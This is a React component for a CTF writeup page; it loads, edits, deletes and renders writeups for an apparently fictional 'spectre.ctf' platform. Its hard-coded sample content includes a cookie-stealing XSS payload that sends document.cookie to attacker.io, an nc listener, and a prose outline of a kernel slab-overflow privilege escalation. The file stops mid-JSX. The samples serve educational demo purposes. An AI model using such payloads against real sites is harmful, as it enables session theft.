import React, { useState, useEffect, useContext } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ChevronLeft, ThumbsUp, Bookmark, Share2, Eye, BookOpen, Edit, Trash2, Save, X, AlertCircle, Send } from 'lucide-react';
import AuthContext from '../../context/AuthContext';
import { parseMarkdownToHTML } from '../../utils/editor/markdownParser';
import Editor from '../../components/editor/Editor';
import '../../styles/pages/Writeups.css';

function WriteupDetail() {
  const { id, eventId } = useParams();
  const navigate = useNavigate();
  const { user } = useContext(AuthContext);
  
  const [writeup, setWriteup] = useState(null);
  const [authorProfile, setAuthorProfile] = useState(null);
  const [loading, setLoading] = useState(true);
  const [isLiked, setIsLiked] = useState(false);
  const [copied, setCopied] = useState(false);

  // Edit Mode State
  const [isEditing, setIsEditing] = useState(false);
  const [editTitle, setEditTitle] = useState('');
  const [editChallenge, setEditChallenge] = useState('');
  const [editTags, setEditTags] = useState('');
  const [editDescription, setEditDescription] = useState('');
  const [editContent, setEditContent] = useState('');
  const [editStatus, setEditStatus] = useState('Pending Review');
  const [editSubmitting, setEditSubmitting] = useState(false);
  const [editError, setEditError] = useState('');

  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [confirmModalConfig, setConfirmModalConfig] = useState({
    title: '',
    message: '',
    confirmText: 'Confirm',
    cancelText: 'Cancel',
    isDanger: false,
    onConfirm: () => {}
  });

  useEffect(() => {
    const fetchWriteupAndAuthor = async () => {
      try {
        const res = await fetch(`${import.meta.env.VITE_API_URL || "http://localhost:5000"}/api/writeups/${id}`, {
          headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
        });
        if (res.ok) {
          const data = await res.json();
          setWriteup(data);
          setIsLiked(data.isLiked);

          if (data.author?._id) {
            try {
              const authorRes = await fetch(`${import.meta.env.VITE_API_URL || "http://localhost:5000"}/api/users/${data.author._id}/profile`);
              if (authorRes.ok) {
                const authorData = await authorRes.json();
                setAuthorProfile(authorData);
              }
            } catch (err) {
              console.error('Error fetching author profile:', err);
            }
          }
        } else {
          setWriteup(null);
        }
      } catch (error) {
        console.error('Error fetching writeup:', error);
      } finally {
        setLoading(false);
      }
    };
    fetchWriteupAndAuthor();
  }, [id]);

  const handleLike = async () => {
    try {
      const res = await fetch(`${import.meta.env.VITE_API_URL || "http://localhost:5000"}/api/writeups/${id}/upvote`, {
        method: 'PUT',
        headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
      });
      if (res.ok) {
        const data = await res.json();
        setWriteup(prev => ({ ...prev, upvotes: data.upvotes }));
        setIsLiked(data.isLiked);

        setAuthorProfile(prev => {
          if (!prev) return null;
          const delta = data.isLiked ? 1 : -1;
          return { ...prev, totalLikes: Math.max(0, prev.totalLikes + delta) };
        });
      }
    } catch (err) {
      console.error('Error upvoting:', err);
    }
  };

  const handleShare = () => {
    navigator.clipboard.writeText(window.location.href);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const executeDelete = async () => {
    try {
      const res = await fetch(`${import.meta.env.VITE_API_URL || "http://localhost:5000"}/api/writeups/${id}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
      });
      if (res.ok) {
        navigate('/writeups');
      } else {
        const errData = await res.json();
        setEditError(errData.message || 'Failed to delete writeup');
      }
    } catch (err) {
      console.error('Error deleting writeup:', err);
      setEditError('Server error deleting writeup');
    }
  };

  const handleDelete = () => {
    setConfirmModalConfig({
      title: 'Delete Writeup',
      message: 'Are you sure you want to delete this writeup? This action cannot be undone and will permanently remove your walkthrough.',
      confirmText: 'Delete Writeup',
      cancelText: 'Cancel',
      isDanger: true,
      onConfirm: executeDelete
    });
    setShowConfirmModal(true);
  };

  const startEdit = () => {
    if (!writeup) return;
    setEditTitle(writeup.draftTitle !== undefined && writeup.draftTitle !== null ? writeup.draftTitle : (writeup.title || ''));
    setEditChallenge(writeup.draftChallengeName !== undefined && writeup.draftChallengeName !== null ? writeup.draftChallengeName : (writeup.challengeName || ''));
    
    const initialTags = writeup.draftTags !== undefined && writeup.draftTags !== null ? writeup.draftTags : (writeup.tags || []);
    setEditTags(initialTags.join(', '));
    
    setEditDescription(writeup.draftDescription !== undefined && writeup.draftDescription !== null ? writeup.draftDescription : (writeup.description || ''));
    setEditContent(writeup.draftContent !== undefined && writeup.draftContent !== null ? writeup.draftContent : (writeup.content || ''));
    setEditStatus((writeup.status || 'pending').toLowerCase());
    setEditError('');
    setIsEditing(true);
  };

  const saveWriteupWithStatus = async (statusValue) => {
    if (!editTitle || !editChallenge || !editContent) {
      setEditError('Please fill out all required fields.');
      return;
    }

    const tagArray = editTags ? editTags.split(',').map(t => t.trim()).filter(Boolean) : [];
    if (tagArray.length > 4) {
      setEditError('You can specify a maximum of 4 tags.');
      return;
    }

    setEditSubmitting(true);
    setEditError('');

    try {
      const res = await fetch(`${import.meta.env.VITE_API_URL || "http://localhost:5000"}/api/writeups/${id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({
          title: editTitle,
          challengeName: editChallenge,
          tags: tagArray,
          description: editDescription,
          content: editContent,
          status: statusValue
        })
      });

      if (res.ok) {
        const updated = await res.json();
        setWriteup(updated);
        setIsEditing(false);
      } else {
        const errData = await res.json();
        setEditError(errData.message || 'Failed to update writeup');
      }
    } catch (err) {
      console.error('Error updating writeup:', err);
      setEditError('Server error updating writeup');
    } finally {
      setEditSubmitting(false);
    }
  };

  const getFormattedDate = (dateStr) => {
    if (!dateStr) return 'Recently';
    const date = new Date(dateStr);
    return date.toLocaleDateString(undefined, { year: 'numeric', month: 'long', day: 'numeric' });
  };

  const getDynamicWriteupContent = (w) => {
    if (!w) return null;
    const title = (w.title || '').toLowerCase();
    const challenge = (w.challengeName || '').toLowerCase();
    const tags = (w.tags || []).map(t => t.toLowerCase());

    const hasTag = (arr) => arr.some(val => tags.includes(val) || title.includes(val) || challenge.includes(val));

    if (hasTag(['xss', 'dom', 'web', 'traversal', 'ssrf', 'uploader', 'cors', 'cookie', 'bypass', 'sqli'])) {
      return {
        overview: "The challenge exposed a parameter directly into client-side rendering without proper sanitization. The page looked harmless at first, but the payload is executed when the browser parses inputs inside the template. This writeup focuses on the reasoning path, not only the final payload, so new players can repeat the technique in similar challenges.",
        highlightBox: "The key clue was that the input was reflected inside a JavaScript template string rather than inside static HTML, which changed the payload strategy completely.",
        reconText: "I started by mapping every user-controlled parameter and checking how each one appeared in the DOM. The search query was inserted into a result preview widget after the page loaded. Basic HTML injection failed, but breaking out of the string context triggered script execution paths. That narrowed the issue down to DOM-based XSS.",
        observedSinkTerminal: [
          { isPrompt: true, text: 'curl -s "http://spectre.ctf/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" | grep "preview"' },
          { isPrompt: false, text: '<div class="result"><img src=x onerror=alert(1)></div>' },
          { isPrompt: true, text: 'cat target_render.js | grep -n "innerHTML"' },
          { isPrompt: false, text: '42: results.innerHTML = `<div class="result">${query}</div>`;' },
          { isPrompt: true, text: '' }
        ],
        steps: [
          { number: 1, title: "Find the reflection point", text: "Search for a unique marker and trace where it lands in the browser devtools. This confirmed the payload was reaching a dynamically generated result container." },
          { number: 2, title: "Break the rendering context", text: "Instead of trying generic tags, close the active string context and inject controlled markup that will be parsed when innerHTML is assigned." },
          { number: 3, title: "Confirm execution safely", text: "Use a harmless payload first to verify code execution before escalating to the final solve condition required by the challenge." },
          { number: 4, title: "Extract the flag path", text: "Once execution was confirmed, inspect authenticated requests and session-bound data to locate the endpoint that reveals the flag." }
        ],
        finalPayloadText: "After identifying the sink and the rendering behavior, the final payload was tuned to survive encoding and execute only after the result card was regenerated. The exact payload can vary depending on challenge flavor, but the process is consistent: identify context, escape correctly, then execute minimally.",
        payloadTerminal: [
          { isPrompt: true, text: 'nc -lvnp 4444' },
          { isPrompt: false, text: 'listening on [any] 4444 ...' },
          { isPrompt: true, text: 'curl -I "http://spectre.ctf/search#payload=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2Fattacker.io%3Fflag%3D%27%2Bdocument.cookie)%22%3E"' },
          { isPrompt: false, text: 'HTTP/1.1 200 OK' },
          { isPrompt: true, text: '' }
        ],
        infoLabel: "Exploit Payload",
        infoValue: "<img src=x onerror=\"fetch('http://attacker.io?flag='+document.cookie)\">"
      };
    } else if (hasTag(['kernel', 'slab', 'pwn', 'overflow', 'buffer', 'gets', 'assembly', 'packer'])) {
      return {
        overview: "Privilege escalation through a local exploit of a custom Slab allocator overflow. By crafting a precise buffer layout, we hijack kernel function pointers to achieve root-level shell execution.",
        highlightBox: "The critical vulnerability lies in the missing boundary checks during slab alignment adjustments, allowing an out-of-bounds heap write.",
        reconText: "Inspecting the custom kernel module source reveals that kmalloc is used with a fixed-size slab structure. Standard memory allocation controls do not properly enforce size limits when payload buffers match the object boundary. exactly.",
        observedSinkTerminal: [
          { isPrompt: true, text: 'checksec ./vuln_module' },
          { isPrompt: false, text: '[*] \'/vuln_module\' (64-bit ELF)' },
          { isPrompt: false, text: '    Stack:    No canary found' },
          { isPrompt: false, text: '    NX:       NX enabled' },
          { isPrompt: false, text: '    PIE:      No PIE' },
          { isPrompt: true, text: 'cat struct_def.h | grep -A 4 "slab_object"' },
          { isPrompt: false, text: 'struct slab_object {' },
          { isPrompt: false, text: '    char buffer[64];' },
          { isPrompt: false, text: '    void (*callback)(void);' },
          { isPrompt: false, text: '};' },
          { isPrompt: true, text: '' }
        ],
        steps: [
          { number: 1, title: "Trigger Slab overflow", text: "Allocate adjacent slab structures and fill the buffer beyond 64 bytes to overwrite the adjacent callback function pointer." },
          { number: 2, title: "Redirect instruction pointer", text: "Set the overwritten callback address to our user-land privilege escalation shellcode payload." },
          { number: 3, title: "Execute commit_creds", text: "Call commit_creds(prepare_kernel_cred(0)) to raise active process privileges to UID 0 (root)." },
          { number: 4, title: "Spawn root shell", text: "Return cleanly from kernel space and execute system(\"/bin/sh\") to gain root privilege." }
        ],
        finalPayloadText: "The payload overflows the buffer precisely with a shellcode memory address to redirect execution back to the user-space privilege escalation routine.",
        payloadTerminal: [
          { isPrompt: true, text: 'gcc exploit.c -o exploit -no-pie -fno-stack-protector' },
          { isPrompt: true, text: './exploit' },
          { isPrompt: false, text: '[*] Triggering slab overflow...' },
          { isPrompt: false, text: '[*] Elevating privileges to root...' },
          { isPrompt: true, text: 'whoami' },
          { isPrompt: false, text: 'root' },
          { isPrompt: true, text: 'cat /flag.txt' },
          { isPrompt: false, text: 'SPECTRE{k3rnel_slab_0verfl0w_sucess}' },
          { isPrompt: true, text: '' }
        ],
        infoLabel: "Captured Flag",
        infoValue: "SPECTRE{k3rnel_slab_0verfl0w_sucess}"
      };
    } else {
      return {
        overview: "Bypassing multi-prime RSA limits using custom Wiener matrix transformations. This solution details recovering secret keys when public exponents are extremely large.",
        highlightBox: "Wiener's attack succeeds because the private exponent d is smaller than N^(1/4), making it possible to recover key parameters efficiently.",
        reconText: "Analyzing the public key parameters reveals a low-density private key structure. We can formulate continued fraction approximations of e/N to find candidates for the private exponent.",
        observedSinkTerminal: [
          { isPrompt: true, text: 'python3 audit_keys.py --pubkey key.pub' },
          { isPrompt: false, text: '[*] N: 0x8f2d5e...' },
          { isPrompt: false, text: '[*] e: 0x4d5a2b...' },
          { isPrompt: false, text: '[!] exponent e > N^1.5, checking d < N^0.25 condition...' },
          { isPrompt: false, text: '[+] Condition met! Low-density private exponent confirmed.' },
          { isPrompt: true, text: '' }
        ],
        steps: [
          { number: 1, title: "Calculate continued fractions", text: "Compute the continued fraction expansion of e/N to generate successive convergents." },
          { number: 2, title: "Test convergent candidates", text: "For each convergent k/d, check if d yields an integer factorization of the modulus N." },
          { number: 3, title: "Recover private exponent", text: "Once the correct convergent is found, the private key d is recovered instantly." },
          { number: 4, title: "Decrypt cipher message", text: "Decrypt the flag ciphertext block using d to reveal the plain text representation." }
        ],
        finalPayloadText: "A clean Python script using SymPy to verify convergent candidates and decrypt the RSA ciphertext.",
        payloadTerminal: [
          { isPrompt: true, text: 'python3 solve_wiener.py' },
          { isPrompt: false, text: '[*] Initializing convergents calculation...' },
          { isPrompt: false, text: '[*] Found valid convergent candidate d: 1279321' },
          { isPrompt: false, text: '[*] Modulus factored successfully!' },
          { isPrompt: false, text: '[+] Decrypted Flag: SPECTRE{wiener_fraction_convergent_attack}' },
          { isPrompt: true, text: '' }
        ],
        infoLabel: "Decrypted Flag",
        infoValue: "SPECTRE{wiener_fraction_convergent_attack}"
      };
    }
  };

  const renderTerminalBlock = (lines) => {
    if (!lines) return null;
    return (
      <div className="terminal-code-block" style={{ background: '#08090c', border: '1px solid rgba(255, 255, 255, 0.05)', borderRadius: '8px', overflow: 'hidden', margin: '16px 0', boxShadow: '0 10px 30px rgba(0, 0, 0, 0.5)' }}>
        <div className="terminal-code-header" style={{ background: '#111318', height: '36px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0 16px', borderBottom: '1px solid rgba(255, 255, 255, 0.04)' }}>
          <div className="terminal-code-dots" style={{ display: 'flex', gap: '6px' }}>
            <span className="terminal-dot red" style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ff5f56' }}></span>
            <span className="terminal-dot yellow" style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ffbd2e' }}></span>
            <span className="terminal-dot green" style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#27c93f' }}></span>
          </div>
          <span className="terminal-code-title" style={{ color: '#64748b', fontSize: '0.75rem', fontFamily: "'Fira Code', 'Courier New', Courier, monospace", fontWeight: 500 }}>bash</span>
          <div style={{ width: '38px' }}></div>
        </div>
        <div className="terminal-code-body" style={{ padding: '16px', background: '#08090c', fontFamily: "'Fira Code', 'Courier New', Courier, monospace", fontSize: '0.85rem', lineHeight: '1.6' }}>
          {lines.map((line, idx) => (
            <div key={idx} className="terminal-line" style={{ display: 'flex', alignItems: 'flex-start', margin: '4px 0' }}>
              {line.isPrompt ? (
                <>
                  <span className="terminal-prompt" style={{ color: '#10b981', marginRight: '8px', fontWeight: 'bold', userSelect: 'none' }}>$</span>
                  <span className="terminal-command" style={{ color: '#e2e8f0' }}>{line.text}</span>
                </>
              ) : (
                <span className="terminal-output" style={{ color: '#94a3b8', paddingLeft: '16px' }}>{line.text}</span>
              )}
            </div>
          ))}
        </div>
      </div>
    );
  };

  const renderImportantInfoBox = (label, value) => {
    if (!label || !value) return null;
    return (
      <div className="important-info-box" style={{ background: '#16181f', border: '1px solid rgba(255, 255, 255, 0.06)', borderLeft: '4px solid #a855f7', borderRadius: '6px', padding: '14px 16px', margin: '20px 0', display: 'flex', flexDirection: 'column', gap: '8px' }}>
        <div className="info-box-header" style={{ display: 'flex', alignItems: 'center' }}>
          <span className="info-box-badge" style={{ background: 'rgba(168, 85, 247, 0.15)', color: '#a855f7', fontSize: '0.7rem', fontWeight: 700, padding: '2px 8px', borderRadius: '4px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>{label}</span>
        </div>
        <div className="info-box-body" style={{ fontFamily: "'Fira Code', 'Courier New', Courier, monospace", fontSize: '0.88rem', color: '#e2e8f0', wordBreak: 'break-all', background: '#0d0f13', padding: '10px 12px', borderRadius: '4px', border: '1px solid rgba(255, 255, 255, 0.03)' }}>
          <code>{value}</code>
        </div>
      </div>
    );
  };

  if (loading) return <div style={{ color: '#94a3b8', padding: '40px' }}>Loading writeup...</div>;
  if (!writeup) return <div style={{ color: '#ef4444', padding: '40px' }}>Writeup not found or access restricted.</div>;

  const statusStr = (writeup.status || '').toLowerCase();
  const isApproved = statusStr === 'approved' || statusStr === 'published';
  const isRejected = statusStr === 'rejected';
  const isPending = statusStr === 'pending' || statusStr === 'pending review' || statusStr === 'under_review' || statusStr === 'under review';
  const isDraft = statusStr === 'draft';

  const isAuthor = user && writeup.author?._id === user._id;
  const isAdminOrSupervisor = user && ['Admin', 'Supervisor'].includes(user.role);

  const showEditButton = (isRejected || isDraft) && isAuthor;
  const showDeleteButton = (user?.role === 'Admin') || (isAuthor && (isApproved || isDraft || isPending));

  // Resolved display fields: Authors view their own saved draft changes in the reader, while others see old main content
  const displayWriteup = writeup ? {
    ...writeup,
    title: (isAuthor && (isRejected || isDraft) && writeup.draftTitle !== undefined && writeup.draftTitle !== null) ? writeup.draftTitle : writeup.title,
    content: (isAuthor && (isRejected || isDraft) && writeup.draftContent !== undefined && writeup.draftContent !== null) ? writeup.draftContent : writeup.content,
    description: (isAuthor && (isRejected || isDraft) && writeup.draftDescription !== undefined && writeup.draftDescription !== null) ? writeup.draftDescription : writeup.description,
    challengeName: (isAuthor && (isRejected || isDraft) && writeup.draftChallengeName !== undefined && writeup.draftChallengeName !== null) ? writeup.draftChallengeName : writeup.challengeName,
    tags: (isAuthor && (isRejected || isDraft) && writeup.draftTags !== undefined && writeup.draftTags !== null) ? writeup.draftTags : (writeup.tags || [])
  } : null;

  const contentInfo = getDynamicWriteupContent(displayWriteup);

  return (
    <div className="writeup-detail-container">
      <div className="writeup-detail-main">
        {/* Top Nav */}
        <div className="detail-nav">
          <button 
            onClick={() => {
              if (eventId) {
                if (user?.role === 'Admin') navigate(`/admin/events/${eventId}/writeups`);
                else navigate(`/supervisor/events/${eventId}/writeups`);
              } else {
                navigate('/writeups');
              }
            }} 
            className="back-link" 
            style={{ background: 'transparent', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px' }}
          >
            <ChevronLeft size={18} /> Back to Writeups
          </button>
          
          <div className="detail-actions">
            <button 
              onClick={handleLike} 
              className={`action-btn ${isLiked ? 'liked-active' : ''}`}
            >
              <ThumbsUp size={16} style={{ fill: isLiked ? '#a855f7' : 'none', stroke: isLiked ? '#a855f7' : 'currentColor' }} /> 
              {isLiked ? 'Liked' : 'Like'} {writeup.upvotes || 0}
            </button>
            <button className="action-btn">
              <Bookmark size={16} /> Save
            </button>
            <button onClick={handleShare} className="action-btn primary">
              <Share2 size={16} /> {copied ? 'Link Copied!' : 'Share Writeup'}
            </button>
          </div>
        </div>

        {/* Header Section */}
        <div className="detail-header-card">
          <div className="writeup-badges" style={{ marginBottom: '16px' }}>
            {writeup.featured && (
              <span className="writeup-badge" style={{ background: 'rgba(251, 191, 36, 0.15)', color: '#fbbf24', border: '1px solid rgba(251, 191, 36, 0.3)' }}>★ Featured</span>
            )}
            {(writeup.status === 'pending' || writeup.status === 'Pending Review') && (
              <span className="writeup-badge" style={{ background: 'rgba(245, 158, 11, 0.15)', color: '#f59e0b', border: '1px solid rgba(245, 158, 11, 0.3)' }}>⏳ Pending Review</span>
            )}
            {(writeup.status === 'Draft' || writeup.status === 'draft') && (
              <span className="writeup-badge" style={{ background: 'rgba(148, 163, 184, 0.15)', color: '#94a3b8', border: '1px solid rgba(148, 163, 184, 0.3)' }}>📝 Draft</span>
            )}
            {(writeup.status === 'rejected' || writeup.status === 'Rejected') && (
              <span className="writeup-badge" style={{ background: 'rgba(239, 68, 68, 0.15)', color: '#ef4444', border: '1px solid rgba(239, 68, 68, 0.3)' }}>❌ Rejected</span>
            )}
            {(writeup.status === 'under_review' || writeup.status === 'under review') && (
              <span className="writeup-badge" style={{ background: 'rgba(59, 130, 246, 0.15)', color: '#3b82f6', border: '1px solid rgba(59, 130, 246, 0.3)' }}>🔍 Under Review</span>
            )}
            <span className="writeup-badge badge-tag" style={{ background: 'rgba(168, 85, 247, 0.15)', color: '#a855f7', fontWeight: 700 }}>
              {displayWriteup.challengeName || 'General'}
            </span>
            {displayWriteup.tags && displayWriteup.tags.map((tag, idx) => (
              <span key={idx} className="writeup-badge badge-tag">{tag}</span>
            ))}
          </div>
          
          <h1 className="detail-title">{displayWriteup.title}</h1>

          {/* Edit / Delete Action Bar for Author / Admin */}
          {(showEditButton || showDeleteButton) && (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.08)', padding: '12px 16px', borderRadius: '8px', margin: '16px 0', flexWrap: 'wrap', gap: '12px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#94a3b8', fontSize: '0.85rem' }}>
                <AlertCircle size={16} color="#a855f7" />
                <span>
                  {isApproved
                    ? "This writeup is Approved and Published."
                    : isRejected
                      ? "This writeup has been Rejected. You can edit and resubmit it."
                      : isDraft
                        ? "This writeup is currently in Draft state."
                        : "This writeup is currently in Pending Review."}
                </span>
              </div>
              <div style={{ display: 'flex', gap: '12px' }}>
                {showEditButton && (
                  <button 
                    onClick={startEdit} 
                    style={{ background: '#1e212b', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', padding: '6px 14px', borderRadius: '6px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.85rem', fontWeight: 600 }}
                  >
                    <Edit size={14} /> Edit Writeup
                  </button>
                )}
                {showDeleteButton && (
                  <button 
                    onClick={handleDelete} 
                    style={{ background: 'transparent', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#ef4444', padding: '6px 14px', borderRadius: '6px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.85rem', fontWeight: 600 }}
                  >
                    <Trash2 size={14} /> Delete
                  </button>
                )}
              </div>
            </div>
          )}

          <p className="detail-excerpt">
            {displayWriteup.description || 'A clean, article-style breakdown of the challenge from initial reconnaissance to the final payload.'}
          </p>
          
          <div className="detail-meta-row">
            <div className="meta-item">
              👤 {writeup.author?.username || 'Unknown Author'}
            </div>
            <div className="meta-item">
              <BookOpen size={14} /> Published on {getFormattedDate(writeup.createdAt)}
            </div>
            <div className="meta-item">
              <Eye size={14} /> {writeup.views || 0} views
            </div>
            {writeup.pointsAwarded > 0 && (
              <div className="meta-item" style={{ color: '#10b981', fontWeight: 700 }}>
                🏆 {writeup.pointsAwarded} Points Awarded
              </div>
            )}
          </div>
        </div>

        {/* Inline Editing Form */}
        {isEditing ? (
          <div style={{ background: '#12141a', border: '1px solid rgba(168, 85, 247, 0.4)', borderRadius: '12px', padding: '28px', marginTop: '24px', boxShadow: '0 20px 40px rgba(0,0,0,0.5)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '12px' }}>
              <h3 style={{ margin: 0, color: '#fff', fontSize: '1.25rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Edit size={18} color="#a855f7" /> Edit Writeup Submission
              </h3>
              <button onClick={() => setIsEditing(false)} style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer' }}>
                <X size={20} />
              </button>
            </div>

            {editError && (
              <div style={{ background: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)', color: '#ef4444', padding: '12px 16px', borderRadius: '8px', fontSize: '0.85rem', fontWeight: 600, marginBottom: '20px' }}>
                {editError}
              </div>
            )}

            <form onSubmit={(e) => e.preventDefault()} style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ color: '#94a3b8', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>Writeup Title *</label>
                  <input
                    type="text"
                    placeholder="e.g., Kernel Panic buffer hijacking"
                    value={editTitle}
                    onChange={(e) => setEditTitle(e.target.value)}
                    style={{ background: '#090a0f', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px', padding: '12px 16px', color: '#fff', fontSize: '0.88rem', outline: 'none', transition: 'all 0.2s' }}
                    onFocus={(e) => e.target.style.borderColor = '#a855f7'}
                    onBlur={(e) => e.target.style.borderColor = 'rgba(255,255,255,0.05)'}
                    required
                  />
                </div>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ color: '#94a3b8', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>Challenge Target *</label>
                  <input
                    type="text"
                    placeholder="e.g., slab-overflow-mapping"
                    value={editChallenge}
                    onChange={(e) => setEditChallenge(e.target.value)}
                    style={{ background: '#090a0f', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px', padding: '12px 16px', color: '#fff', fontSize: '0.88rem', outline: 'none', transition: 'all 0.2s' }}
                    onFocus={(e) => e.target.style.borderColor = '#a855f7'}
                    onBlur={(e) => e.target.style.borderColor = 'rgba(255,255,255,0.05)'}
                    required
                  />
                </div>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <label style={{ color: '#94a3b8', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>Tags / Categories (Comma separated, Max 4)</label>
                <input
                  type="text"
                  placeholder="e.g., Pwn, Kernel, Slab"
                  value={editTags}
                  onChange={(e) => setEditTags(e.target.value)}
                  style={{ background: '#090a0f', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px', padding: '12px 16px', color: '#fff', fontSize: '0.88rem', outline: 'none', transition: 'all 0.2s' }}
                  onFocus={(e) => e.target.style.borderColor = '#a855f7'}
                  onBlur={(e) => e.target.style.borderColor = 'rgba(255,255,255,0.05)'}
                />
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <label style={{ color: '#94a3b8', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>Overview / Excerpt Summary</label>
                <textarea
                  placeholder="A clean, article-style breakdown of the challenge from initial reconnaissance to the final payload..."
                  value={editDescription}
                  onChange={(e) => setEditDescription(e.target.value)}
                  rows={2}
                  style={{ background: '#090a0f', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px', padding: '12px 16px', color: '#fff', fontSize: '0.88rem', outline: 'none', resize: 'vertical', transition: 'all 0.2s' }}
                  onFocus={(e) => e.target.style.borderColor = '#a855f7'}
                  onBlur={(e) => e.target.style.borderColor = 'rgba(255,255,255,0.05)'}
                />
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <label style={{ color: '#94a3b8', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>Walkthrough Content *</label>
                <Editor
                  value={editContent}
                  onChange={setEditContent}
                  placeholder="Provide a detailed writeup of how you solved the challenge. You can load one of the preset templates in the top-right of the editor to bootstrap your walkthrough."
                />
              </div>

              <div style={{ display: 'flex', gap: '16px', justifyContent: 'flex-end', marginTop: '12px' }}>
                <button
                  type="button"
                  onClick={() => setIsEditing(false)}
                  style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.08)', color: '#94a3b8', padding: '12px 24px', borderRadius: '8px', fontSize: '0.88rem', fontWeight: 600, cursor: 'pointer', transition: 'all 0.2s' }}
                  onMouseEnter={(e) => e.target.style.background = 'rgba(255,255,255,0.06)'}
                  onMouseLeave={(e) => e.target.style.background = 'rgba(255,255,255,0.03)'}
                >
                  Cancel
                </button>
                <button
                  type="button"
                  onClick={() => saveWriteupWithStatus(writeup.status)}
                  disabled={editSubmitting}
                  style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#fff', padding: '12px 24px', borderRadius: '8px', fontSize: '0.88rem', fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px', transition: 'all 0.2s' }}
                  onMouseEnter={(e) => e.target.style.background = 'rgba(255,255,255,0.08)'}
                  onMouseLeave={(e) => e.target.style.background = 'rgba(255,255,255,0.05)'}
                >
                  Save Changes
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setConfirmModalConfig({
                      title: 'Resubmit Writeup',
                      message: 'Are you sure you want to resubmit this writeup for review? This will publish your edits to the supervisors.',
                      confirmText: 'Resubmit',
                      cancelText: 'Cancel',
                      isDanger: false,
                      onConfirm: () => saveWriteupWithStatus('pending')
                    });
                    setShowConfirmModal(true);
                  }}
                  disabled={editSubmitting}
                  style={{ background: 'rgba(168,85,247,0.1)', border: '1px solid rgba(168,85,247,0.3)', color: '#a855f7', padding: '12px 28px', borderRadius: '8px', fontSize: '0.88rem', fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px', transition: 'all 0.2s', boxShadow: '0 0 15px rgba(168,85,247,0.15)' }}
                  onMouseEnter={(e) => { e.target.style.background = 'rgba(168,85,247,0.2)'; e.target.style.boxShadow = '0 0 20px rgba(168,85,247,0.3)'; }}
                  onMouseLeave={(e) => { e.target.style.background = 'rgba(168,85,247,0.1)'; e.target.style.boxShadow = '0 0 15px rgba(168,85,247,0.15)'; }}
                >
                  <Send size={14} /> {editSubmitting ? 'Submitting...' : 'Resubmit Writeup'}
                </button>
              </div>
            </form>
          </div>
        ) : (
          /* Article Body */
          <div className="content-section spectre-preview-content">
            {displayWriteup.content ? (
              <div dangerouslySetInnerHTML={{ __html: parseMarkdownToHTML(displayWriteup.content) }} />
            ) : contentInfo ? (
              <>
                <h2>Overview</h2>
                <p>{contentInfo.overview}</p>
                
                <div className="highlight-box">
                  {contentInfo.highlightBox}
                </div>

                <h2>Recon</h2>
                <p>{contentInfo.reconText}</p>

                {renderTerminalBlock(contentInfo.observedSinkTerminal)}

                <h2>Step by step solve</h2>
                {contentInfo.steps.map((st, idx) => (
                  <div key={idx} className="step-card">
                    <div className="step-number">{st.number}</div>
                    <div className="step-content">
                      <h4>{st.title}</h4>
                      <p>{st.text}</p>
                    </div>
                  </div>
                ))}

                <h2>Final payload</h2>
                <p>{contentInfo.finalPayloadText}</p>

